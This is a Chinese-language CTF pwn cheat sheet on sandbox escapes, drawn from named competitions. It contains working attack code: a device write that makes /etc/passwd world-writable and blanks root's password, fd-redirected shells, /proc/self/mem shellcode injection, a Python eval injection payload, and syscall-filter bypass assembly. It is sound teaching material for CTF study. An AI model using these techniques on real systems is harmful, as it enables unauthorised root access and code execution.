# CTF Pwn - 沙箱逃逸与受限环境

## Table of Contents
- [Python 沙箱逃逸](#python-沙箱逃逸)
- [VM 利用（自定义字节码）](#vm-利用自定义字节码)
- [FUSE/CUSE 字符设备利用](#fusecuse-字符设备利用)
- [Busybox / 受限 shell 提权](#busybox--受限-shell-提权)
- [Shell 技巧](#shell-技巧)
- [通过 /proc/self/mem 任意写（BSidesSF 2025）](#通过-procselfmem-任意写bsidessf-2025)
- [利用 process_vm_readv 失败实现沙箱逃逸（0CTF 2016）](#利用-process_vm_readv-失败实现沙箱逃逸0ctf-2016)
- [用命名管道 mkfifo 绕过文件大小检查（Nuit du Hack 2016）](#用命名管道-mkfifo-绕过文件大小检查nuit-du-hack-2016)
- [通过游戏逻辑触发 Lua 整数下溢（ASIS CTF Finals 2017）](#通过游戏逻辑触发-lua-整数下溢asis-ctf-finals-2017)
- [CPU 模拟器 PRINT 指令的 Python eval 注入（Midnight Sun CTF 2018）](#cpu-模拟器-print-指令的-python-eval-注入midnight-sun-ctf-2018)
- [用 sysenter 与冷门系统调用绕过 Unicorn 模拟器系统调用黑名单（Meepwn CTF Quals 2018）](#用-sysenter-与冷门系统调用绕过-unicorn-模拟器系统调用黑名单meepwn-ctf-quals-2018)
- [自定义 VM swap 指令覆写自身指针（HITCON 2018）](#自定义-vm-swap-指令覆写自身指针hitcon-2018)

---

<a id="python-sandbox-escape"></a>
## Python 沙箱逃逸

Python jail/sandbox 逃逸的通用技术（AST 绕过、audit hook 绕过、基于 MRO 的内建恢复、装饰器链、受限字符集技巧等）超出本技能范围，这里只讨论与二进制利用相关的部分。

<a id="vm-exploitation-custom-bytecode"></a>
## VM 利用（自定义字节码）

**模式（TerViMator，Pragyan 2026）：** 具备寄存器、操作码与系统调用的自定义 VM。开启 Full RELRO + NX + PIE。

**VM 系统调用中的常见漏洞：**
- **越界读/写：** `inspect(obj, offset)` 与 `write_byte(obj, offset, val)` 缺少边界检查，可读取/修改分配缓冲区之外的对象结构体数据
- **通过 name 溢出结构体：** `name(obj, length)` 直接写入对象结构体，可溢出到相邻的结构体字段

**利用模式：**
1. 分配两个对象（data + exec）
2. 用越界 `inspect` 读取 exec 对象的 XOR 编码函数指针，泄漏 PIE 基址
3. 用 `name` 溢出把 exec 对象的指针改写为 `win() ^ KEY`
4. `execute(obj)` 解码并调用被篡改的函数指针

<a id="fusecuse-character-device-exploitation"></a>
## FUSE/CUSE 字符设备利用

**FUSE**（Filesystem in Userspace）/ **CUSE**（Character device in Userspace）

**关键洞察：** FUSE/CUSE 设备的处理代码运行在用户态，权限等同设备守护进程。若守护进程以 root 运行并通过 write 处理器暴露了命令接口，任何能写该设备文件的用户都能获得 root 级操作能力（chmod、读写文件）。

**识别特征：**
- 查找 `cuse_lowlevel_main()` 或 `fuse_main()` 调用
- 包含 `open`、`read`、`write` 处理器的设备操作结构体
- 通过 `DEVNAME=backdoor` 之类方式注册的设备名

**常见漏洞模式：**
```c
// Backdoor pattern: write handler with command parsing
void backdoor_write(const char *input, size_t len) {
    char *cmd = strtok(input, ":");
    char *file = strtok(NULL, ":");
    char *mode = strtok(NULL, ":");
    if (!strcmp(cmd, "b4ckd00r")) {
        chmod(file, atoi(mode));  // Arbitrary chmod!
    }
}
```

**利用：**
```bash
# Change /etc/passwd permissions via custom device
echo "b4ckd00r:/etc/passwd:511" > /dev/backdoor

# 511 decimal = 0777 octal (rwx for all)
# Now modify passwd to get root
echo "root::0:0:root:/root:/bin/sh" > /etc/passwd
su root
```

**通过修改 passwd 提权：**
1. 借助后门让 `/etc/passwd` 可写
2. 把 root 一行替换为 `root::0:0:root:/root:/bin/sh`（无密码）
3. `su root` 无需密码提示

<a id="busyboxrestricted-shell-escalation"></a>
## Busybox / 受限 shell 提权

在无 sudo 的受限环境中：
1. 通过字符设备寻找可写路径
2. 瞄准系统文件：`/etc/passwd`、`/etc/shadow`、`/etc/sudoers`
3. 先改权限再改内容以取得 root

**关键洞察：** 在没有 sudo 的受限环境中，寻找自定义字符设备（`/dev/backdoor`）或可写的系统文件。任何对 `/etc/passwd`（删除 root 的密码哈希）或 `/etc/sudoers`（添加 NOPASSWD 条目）的写原语都能拿到 root。

<a id="shell-tricks"></a>
## Shell 技巧

**文件描述符重定向（无需反弹 shell）：**
```bash
# Redirect stdin/stdout to client socket (fd 3 common for network)
exec <&3; sh >&3 2>&3

# Or as single command string
exec<&3;sh>&3
```
- 网络服务通常把客户端连接放在 fd 3
- 避免出站连接被防火墙拦截的问题
- 在只有命令执行、字符受限时依然可用

**定位正确的 fd：**
```bash
ls -la /proc/self/fd           # List open file descriptors
```

**更短的 shellcode 写法：**
- `sh<&3 >&3` - 最简的 shell 重定向
- 某些 shell 中可用 `$0` 代替 `sh`

**关键洞察：** 网络服务通常把客户端 socket 放在 fd 3。把 stdin/stdout 重定向到这个 fd（`exec <&3; sh >&3 2>&3`）即可在既有连接上获得交互式 shell，无需出站连通性来建立反弹 shell。

---

<a id="write-anywhere-via-procselfmem-bsidessf-2025"></a>
## 通过 /proc/self/mem 任意写（BSidesSF 2025）

当服务允许以任意偏移向任意文件写入时，把目标设为 `/proc/self/mem` 实现代码注入：

```python
from pwn import *

# Service API: send filename, offset, content
def write_mem(r, offset, data):
    r.sendline(b'/proc/self/mem')
    r.sendline(str(offset).encode())
    r.sendline(data)

# 1. Leak a return address from the stack (or use known binary address)
# 2. Write shellcode to a writable+executable region (or reuse existing code)
# 3. Overwrite return address to point to shellcode

shellcode = asm(shellcraft.sh())

r = remote(host, port)
# Overwrite code at known address (e.g., after close@plt returns)
write_mem(r, target_code_addr, shellcode)
```

**关键洞察：** `/proc/self/mem` 提供对进程虚拟内存的随机访问读写，绕过 mmap 所强制的页保护。即便代码段通过普通 mmap 映射为只读，也可以向其中写入 —— 内核是直接通过页表完成写入的。这等价于调试器的 `PTRACE_POKETEXT`。

**前提条件：** 文件写原语必须能处理二进制数据（含空字节）。目标偏移必须是已映射的有效虚拟地址。

---

<a id="process_vm_readv-failure-as-sandbox-escape-0ctf-2016"></a>
### 利用 process_vm_readv 失败实现沙箱逃逸（0CTF 2016）

**模式：** 沙箱通过调用 `process_vm_readv()` 再 `realpath()` 来校验文件路径。若把内存映射为仅 `PROT_READ`（沙箱进程无法通过 `process_vm_readv` 读取），路径校验会静默失败，从而绕过检查。

```c
// Create memory at fixed address with only read permission
mmap(0x13370000, 0x1000, PROT_READ, MAP_FIXED|MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
// Store path string there -- sandbox's process_vm_readv fails
// realpath() also fails -- path check bypassed entirely
// Then: open("/flag") succeeds through the sandbox
```

**关键洞察：** 使用 `process_vm_readv` 做路径校验的沙箱，默认校验要么成功要么拒绝。失败情况（内存不可读）未被处理，于是形成绕过。被沙箱的进程读自己的内存一切正常，但监管进程无法通过 `process_vm_readv` 读到它。

**参考：** 0CTF 2016

---

<a id="named-pipe-mkfifo-for-file-size-check-bypass-nuit-du-hack-2016"></a>
### 用命名管道 mkfifo 绕过文件大小检查（Nuit du Hack 2016）

**模式：** 程序读取文件并在处理前检查大小。命名管道（FIFO）通过 `stat()` 报告 `st_size = 0`，但 `read()` 时能交付任意数据，从而绕过基于大小的溢出防护。

```bash
mkfifo /tmp/payload_pipe
# In background, feed overflow payload to the pipe
cat exploit_data > /tmp/payload_pipe &
# Binary sees size=0, skips bounds check, reads arbitrary data
./vulnerable_binary /tmp/payload_pipe
```

配合符号链接复用字符串：`ln -s /flag arena.c` 让二进制中已有的字符串成为 ROP 链里的目标文件名。

**关键洞察：** 命名管道在 `stat()` 中始终报告 `st_size = 0`，可绕过任何基于大小的缓冲区分配或边界检查，而 `read()` 仍会交付任意长度的数据。任何在 `read()` 之前用 `stat()` 预分配或校验的程序都是脆弱的。

**参考：** Nuit du Hack 2016

---

<a id="lua-integer-underflow-via-game-logic-asis-ctf-finals-2017"></a>
### 通过游戏逻辑触发 Lua 整数下溢（ASIS CTF Finals 2017）

**模式：** 一个（用 Lua 写的）文字游戏带物品栏管理。两次独立的百分比削减被依次作用于同一个数值，且没有对合计数封顶：先施加 100% 衰减把物品清零，再对已归零的数值施加 10% 惩罚，导致整数下溢到零以下。卖出这些下溢的物品即可产生无限金钱（游戏把巨大的负数当作巨大正数的出售价值，或回绕成无符号最大值）。

**脆弱逻辑：**
```lua
-- Applied sequentially, no combined-total check:
inventory = inventory - math.floor(inventory * 0.10)  -- 10% penalty first
inventory = inventory - math.floor(inventory * 1.00)  -- 100% decay = zeroed

-- If applied in the other order, or combined:
-- 100% decay → inventory = 0
-- 10% of 0 = 0 → total reduction = 100%, no underflow

-- But with uncapped sequential application:
-- Step 1: inventory -= inventory * decay_rate  (e.g., decay=100% → 0)
-- Step 2: inventory -= extra_penalty           (penalty on already-zero → negative)
-- Result: inventory = -penalty_amount  (wraps or treated as large positive)
```

**利用：**
```python
# 1. Identify the two independent reduction events in the game loop
#    (e.g., end-of-round decay AND a transaction penalty)
# 2. Trigger both in the same game tick without intermediate capping
# 3. Verify inventory went negative (may display as large number or 0 + debt)
# 4. Sell the underflowed items: game calculates price * negative_count
#    → negative total, or wraps to huge positive → unlimited currency
# 5. Use unlimited currency to purchase the flag item
```

**关键洞察：** 游戏经济中的业务逻辑缺陷能在完全没有内存破坏的情况下制造整数下溢 —— 两次未封顶、合计超过 100% 的百分比削减就会让目标变量下溢。留意任何在同一 tick 内对同一整数值施加多次独立百分比修正的游戏机制。

**参考：** ASIS CTF Finals 2017

---

<a id="cpu-emulator-print-opcode-python-eval-injection-midnight-sun-ctf-2018"></a>
### CPU 模拟器 PRINT 指令的 Python eval 注入（Midnight Sun CTF 2018）

**模式：** 自定义 CPU 模拟器的 print 函数用 `eval('"' + string_buffer + '"')` 处理输出中的转义序列。用 ADD 指令在模拟器内存中逐字符拼出字符串，然后注入 `"+__import__("os").system("cmd")#`，闭合字符串字面量并执行任意 Python。

**利用思路：**
1. 模拟器实现自定义指令集，含 ADD、MOV、PRINT 等
2. PRINT 指令从模拟器内存读取字符串，并传给 `eval('"' + s + '"')` 以处理 `\n`、`\t` 等转义序列
3. 用 ADD 指令在模拟器内存中逐字符构造注入字符串
4. 注入的字符串 `"+__import__("os").system("cmd")#` 会闭合开头的引号，与 `__import__("os").system()` 拼接，`#` 则注释掉结尾引号

```python
from pwn import *

# Emulator opcodes (example encoding)
ADD = 0x01   # ADD addr, immediate_byte
PRINT = 0x58  # Print string from memory (triggers eval)

def build_char(c):
    """Generate ADD opcodes to set a memory byte to character c"""
    addr = current_mem_ptr()
    return bytes([ADD, addr, ord(c)])

# Build injection payload in emulator memory
cmd = "cat /flag"
injection = '''"+__import__("os").system("%s")#''' % cmd

program = b""
for c in injection:
    program += build_char(c)

# Trigger PRINT opcode -> eval('"' + injection + '"')
# eval becomes: eval('""+__import__("os").system("cat /flag")#"')
# The # comments out the trailing quote
program += bytes([PRINT, 0x00])  # PRINT from address 0

io = remote('target', 1337)
io.send(program)
io.interactive()
```

**关键洞察：** 当模拟器或解释器用 `eval()` 处理字符串输出（例如处理转义序列）时，注入一个引号闭合字符串字面量，再串接任意 Python 代码。`#` 注释字符会截断后面残留的语法。这是典型的 eval 注入 —— 模拟器信任自己的内存内容，但攻击者可以通过普通 CPU 指令控制内存。

**参考：** Midnight Sun CTF 2018

---

<a id="unicorn-emulator-syscall-blacklist-bypass-via-sysenter-and-uncommon-syscalls-meepwn-ctf-quals-2018"></a>
### 用 sysenter 与冷门系统调用绕过 Unicorn 模拟器系统调用黑名单（Meepwn CTF Quals 2018）

**模式：** 一个基于 Unicorn 的 shellcode 运行器挂钩 `UC_HOOK_INSN`（针对 `int 0x80`）与 `UC_HOOK_MEM_*` 来拦截被禁的系统调用号（execve、read、write、mmap）。该过滤只覆盖 `int 0x80` 入口以及作者想到的那几个系统调用。

**绕过：**
1. 用 `sysenter` 代替 `int 0x80` —— Unicorn 的 `INT` 钩子在快速入口路径上不会触发。
2. 使用功能等价但不在黑名单上的系统调用：
   - `dup3` 代替 `dup2`
   - `openat` 代替 `open`
   - `pread64` 代替 `read`
   - `sendfile` 直接把一个文件描述符内容搬到另一个 fd，完全不碰 `write`
3. 若连 `execve` 也在黑名单里，就分阶段投放 payload，最后一级通过 `sys_socketcall`（opcode `0x66`）加构造的系统调用模式切换来执行 `execve("/bin/sh", ...)`。

```asm
; Swap file from /flag to stdout without read/write
mov eax, 0x123            ; __NR_openat
mov ebx, -100             ; AT_FDCWD
lea ecx, [flag_path]
xor edx, edx
sysenter                  ; NOT int 0x80 — bypasses Unicorn INT hook

; fd is now in eax
mov ebx, eax              ; src fd
mov ecx, 1                ; dst fd (stdout)
xor edx, edx              ; NULL offset
mov esi, 0x1000           ; count
mov eax, 0xbb             ; __NR_sendfile
sysenter
```

**关键洞察：** Unicorn 里的指令级过滤针对的是特定操作码。若过滤器只盯 `int 0x80`，任何其他系统调用入口（`sysenter`、`syscall`、x86-32 测试构建上的 `int 0x2e`）都能溜过去。务必枚举功能等价的系统调用：`dup3/openat/pread64/sendfile/writev/mmap2` 几乎覆盖了 `execve/read/write/mmap` 黑名单遗漏的全部场景。

**参考：** Meepwn CTF Quals 2018 — writeups 10415、10428

---

<a id="custom-vm-swap-pointer-self-overwrite-hitcon-2018"></a>
## 自定义 VM swap 指令覆写自身指针（HITCON 2018）

**模式：** 自定义 VM 提供 `swap(a, b)` 指令，按相对保存的 `sp` 的两个栈下标操作。如果 VM 从不校验 `sp_nxt` 是否越界，调用 `swap(-1, 0)` 或 `swap(-2, -1)` 就会把内部 `sp_nxt` 本身当作栈槽，与某个栈槽交换。之后的指令便在任意内存上操作。

```text
swap(-1, 0)     # treats &sp_nxt as stack[-1]; swaps sp_nxt <-> stack[0]
# sp_nxt now points wherever stack[0] used to; writes go anywhere
```

接一条 `push` 把 shellcode 字节写到新的指针处，再把 VM 分发表中的某个函数指针重定向到该 shellcode 区域。

**关键洞察：** 任何能改写自身状态指针的 VM 原语，本身就是即时可用的任意写原语。始终检查 VM 指令在栈指针自身可被寻址时的边界条件。

**参考：** HITCON CTF 2018 — Abyss I，writeups 11918-11919
